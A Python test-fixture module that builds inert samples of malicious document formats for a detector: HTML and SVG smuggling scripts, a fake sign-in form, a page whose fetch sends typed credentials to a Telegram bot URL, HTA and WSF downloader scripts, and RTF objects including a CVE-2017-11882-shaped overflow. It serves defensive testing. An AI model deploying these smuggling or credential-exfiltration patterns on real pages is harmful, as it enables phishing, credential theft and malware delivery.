"""Synthetic HTML, SVG, HTA, WSF, RTF and VHD fixtures.

Everything here is inert text or bytes, built at test time and never run. The smuggled
"payloads" are the harmless fixture PE from build.py (its only code is `ret`) and small
archives of text. Links point at documentation domains (RFC 2606, RFC 5737). The
messaging-service hostnames in the exfiltration fixture are what the detection looks
for; nothing ever contacts them.
"""

from __future__ import annotations

import base64
import struct

from . import archives, build, office

# HTML and SVG ---------------------------------------------------------------------------

SMUGGLE_JS = """
function b64ToBytes(b64) {{
  var bin = window.atob(b64);
  var bytes = new Uint8Array(bin.length);
  for (var i = 0; i < bin.length; i++) {{ bytes[i] = bin.charCodeAt(i); }}
  return bytes;
}}
var payload = "{payload}";
var blob = new Blob([b64ToBytes(payload)], {{type: "application/octet-stream"}});
var a = document.createElement("a");
a.href = window.URL.createObjectURL(blob);
a.download = "{name}";
document.body.appendChild(a);
a.click();
"""


def smuggling_html(payload: bytes | None = None, name: str = "invoice.zip") -> bytes:
    """Classic HTML smuggling: base64 in a script, Blob, object URL, auto-click."""
    data = payload if payload is not None else archives.zip_plain(
        {"readme.txt": b"fixture archive member, plain text"})
    js = SMUGGLE_JS.format(payload=base64.b64encode(data).decode(), name=name)
    return (f"<!DOCTYPE html><html><head><title>Document viewer</title></head><body>"
            f"<p>Loading your document...</p><script>{js}</script></body></html>").encode()


def smuggling_html_exe() -> bytes:
    return smuggling_html(build.benign_exe(), name="update.exe")


def smuggling_split_html() -> bytes:
    """The payload split into concatenated pieces, as obfuscators do."""
    b64 = base64.b64encode(archives.zip_plain({"a.txt": b"fixture member" * 8})).decode()
    pieces = " + ".join(f'"{b64[i:i + 60]}"' for i in range(0, len(b64), 60))
    js = SMUGGLE_JS.format(payload="X", name="report.zip").replace('"X"', pieces)
    return f"<html><body><script>{js}</script></body></html>".encode()


def data_uri_download_html() -> bytes:
    """No script at all: an anchor with a download attribute and a data: URI."""
    b64 = base64.b64encode(archives.zip_plain({"a.txt": b"fixture member" * 8})).decode()
    return (f'<html><body><p>Your file is ready.</p><a download="statement.zip" '
            f'href="data:application/zip;base64,{b64}">Download</a></body></html>').encode()


def csv_export_html() -> bytes:
    """A benign web app's "export CSV" button: Blob and createObjectURL, no payload."""
    js = """
function exportCsv(rows) {
  var csv = rows.map(function (r) { return r.join(","); }).join("\\n");
  var blob = new Blob([csv], {type: "text/csv"});
  var a = document.createElement("a");
  a.href = URL.createObjectURL(blob);
  a.download = "report.csv";
  a.click();
}
"""
    body = "<p>" + "Quarterly figures for the team, with notes and charts. " * 12 + "</p>"
    return (f"<!DOCTYPE html><html><head><title>Report</title><script>{js}</script></head>"
            f"<body>{body}<button onclick=\"exportCsv([[1,2],[3,4]])\">Export</button>"
            "</body></html>").encode()


def newsletter_html() -> bytes:
    """An ordinary page: links, an inline image, a little script, no forms."""
    pixel = base64.b64encode(b"\x89PNG\r\n\x1a\n" + bytes(120)).decode()
    paragraphs = "".join(
        f"<p>Story {i}: community news, events and updates for the month. "
        f'<a href="https://www.example.com/news/{i}">Read more</a></p>' for i in range(8))
    return (f"<!DOCTYPE html><html><head><title>Monthly newsletter</title>"
            f"<style>p {{ margin: 0 }}</style></head><body>"
            f'<img src="data:image/png;base64,{pixel}" alt="logo">{paragraphs}'
            "<script>document.getElementById && console.log('loaded');</script>"
            "</body></html>").encode()


def redirect_html() -> bytes:
    """A wrapper page that only sends the viewer to a remote sign-in page."""
    return (b"<html><head><meta http-equiv=\"refresh\" content=\"0; url=https://login.example.net/"
            b"secure/?id=fixture\"></head><body>Please wait...</body></html>")


def credential_form_html(action: str = "https://collect.example.net/post.php") -> bytes:
    return (f"<html><head><title>Microsoft account</title></head><body>"
            f"<h1>Sign in to view the shared document</h1>"
            f'<form method="post" action="{action}"><input name="email" type="email">'
            f'<input name="pass" type="password"><button>Sign in</button></form>'
            "</body></html>").encode()


def credential_exfil_html() -> bytes:
    js = """
function send() {
  var u = document.getElementById("u").value, p = document.getElementById("p").value;
  fetch("https://api.telegram.org/botFIXTURE/sendMessage?chat_id=1&text=" + u + ":" + p);
}
"""
    return (f"<html><head><title>Sign in</title></head><body><input id=\"u\">"
            f"<input id=\"p\" type=\"password\"><button onclick=\"send()\">Next</button>"
            f"<script>{js}</script></body></html>").encode()


def svg_logo() -> bytes:
    return (b'<?xml version="1.0" encoding="UTF-8"?>\n'
            b'<svg xmlns="http://www.w3.org/2000/svg" width="64" height="64">'
            b'<circle cx="32" cy="32" r="30" fill="#36c"/>'
            b'<a href="https://www.example.com/"><text x="8" y="36">Logo</text></a></svg>')


def svg_redirect() -> bytes:
    return (b'<svg xmlns="http://www.w3.org/2000/svg" width="10" height="10">'
            b'<script type="text/javascript"><![CDATA[\n'
            b'window.location.href = "https://login.example.net/?u=fixture";\n'
            b"]]></script></svg>")


def svg_smuggling() -> bytes:
    b64 = base64.b64encode(archives.zip_plain({"a.txt": b"fixture member" * 8})).decode()
    js = SMUGGLE_JS.format(payload=b64, name="fax.zip")
    return (f'<svg xmlns="http://www.w3.org/2000/svg"><script><![CDATA[{js}]]></script>'
            "</svg>").encode()


# HTA and WSF ----------------------------------------------------------------------------

def hta_downloader() -> bytes:
    """An HTA whose VBScript text names a download and a shell; never run."""
    return b"""<html><head><title>Viewer</title>
<HTA:APPLICATION ID="app" APPLICATIONNAME="viewer" WINDOWSTATE="minimize" SHOWINTASKBAR="no">
<script language="VBScript">
Sub Window_OnLoad
  Set http = CreateObject("MSXML2.XMLHTTP")
  http.Open "GET", "https://files.example.net/fixture.txt", False
  Set sh = CreateObject("WScript.Shell")
  sh.Run "cmd /c echo fixture", 0
  self.close
End Sub
</script></head><body></body></html>"""


def hta_plain() -> bytes:
    return b"""<html><head><HTA:APPLICATION ID="tool"></head>
<body><p>Internal tool placeholder.</p></body></html>"""


def wsf_job() -> bytes:
    return b"""<job id="fixture">
<script language="JScript">
var sh = new ActiveXObject("WScript.Shell");
var x = new ActiveXObject("MSXML2.XMLHTTP");
x.open("GET", "https://files.example.net/fixture.txt", false);
sh.Run("cmd /c echo fixture", 0);
</script>
</job>"""


# RTF ------------------------------------------------------------------------------------

def _ole1(class_name: bytes, native: bytes) -> bytes:
    """An OLE 1.0 embedded object (MS-OLEDS 2.2)."""
    def lp(s: bytes) -> bytes:
        return struct.pack("<I", len(s) + 1) + s + b"\0" if s else struct.pack("<I", 0)
    return (struct.pack("<II", 0x00000501, 2) + lp(class_name) + lp(b"") + lp(b"")
            + struct.pack("<I", len(native)) + native)


def _package_native(filename: str, payload: bytes) -> bytes:
    name = filename.encode() + b"\0"
    src = b"C:\\Users\\fixture\\" + name
    tmp = b"C:\\Users\\fixture\\AppData\\Local\\Temp\\" + name
    return (struct.pack("<H", 2) + name + src + struct.pack("<HH", 0, 3)
            + struct.pack("<I", len(tmp)) + tmp + struct.pack("<I", len(payload)) + payload)


def _object(ole1: bytes, extra: bytes = b"") -> bytes:
    hexdata = ole1.hex().encode()
    lines = b"\n".join(hexdata[i:i + 128] for i in range(0, len(hexdata), 128))
    return (b"{\\object\\objemb" + extra + b"{\\*\\objclass x}{\\*\\objdata " + lines + b"}}")


def _rtf(body: bytes, header: bytes = b"{\\rtf1\\ansi") -> bytes:
    return header + b"{\\fonttbl{\\f0 Arial;}}\\f0 Fixture document.\\par " + body + b"}"


def rtf_plain() -> bytes:
    return _rtf(b"Nothing embedded here.\\par ")


def rtf_package(filename: str = "invoice.exe") -> bytes:
    payload = b"benign fixture payload, not an executable"
    return _rtf(_object(_ole1(b"Package", _package_native(filename, payload))))


def _equation_native(font_name: bytes) -> bytes:
    # EQNOLEFILEHDR (28 bytes) then MTEF: 5-byte header, FONT record (tag 8, typeface,
    # style, NUL-terminated name).
    mtef = bytes([3, 1, 1, 3, 10]) + bytes([0x08, 0x5A, 0x5A]) + font_name + b"\0"
    header = struct.pack("<HIHII", 0x1C, 0x00020000, 0xC2B0, len(mtef), 0) + bytes(12)
    stream = header + mtef
    return office.build_ole({"Equation Native": stream},
                            root_clsid=bytes.fromhex("02CE020000000000C000000000000046"))


def rtf_equation(font_name: bytes = b"Times New Roman", objupdate: bool = False) -> bytes:
    extra = b"\\objupdate" if objupdate else b""
    return _rtf(_object(_ole1(b"Equation.3", _equation_native(font_name)), extra))


def rtf_equation_overflow() -> bytes:
    """The CVE-2017-11882 shape: a font name far longer than the editor's buffer. The
    "name" is the letter A repeated; there is no shellcode."""
    return rtf_equation(b"A" * 48)


def rtf_remote_template() -> bytes:
    return (b"{\\rtf1\\ansi{\\*\\template https://templates.example.net/fixture.dot}"
            b"Fixture.\\par }")


def rtf_obfuscated_header() -> bytes:
    return _rtf(b"Plain.\\par ", header=b"{\\rtvpn")


# VHD ------------------------------------------------------------------------------------

def vhd_fixed(data: bytes = b"") -> bytes:
    """A fixed VHD: raw disk bytes followed by the 512-byte footer."""
    disk = (data or b"fixture disk contents ") + bytes(-len(data or b"x") % 512 or 512)
    footer = bytearray(512)
    footer[0:8] = b"conectix"
    struct.pack_into(">IIQI", footer, 8, 2, 0x00010000, 0xFFFFFFFFFFFFFFFF, 0x2A000000)
    footer[28:32] = b"fixt"
    struct.pack_into(">QQ", footer, 40, len(disk), len(disk))
    struct.pack_into(">I", footer, 60, 2)
    return disk + bytes(footer)


def vhdx() -> bytes:
    return b"vhdxfile" + "fixture".encode("utf-16-le") + bytes(65536)
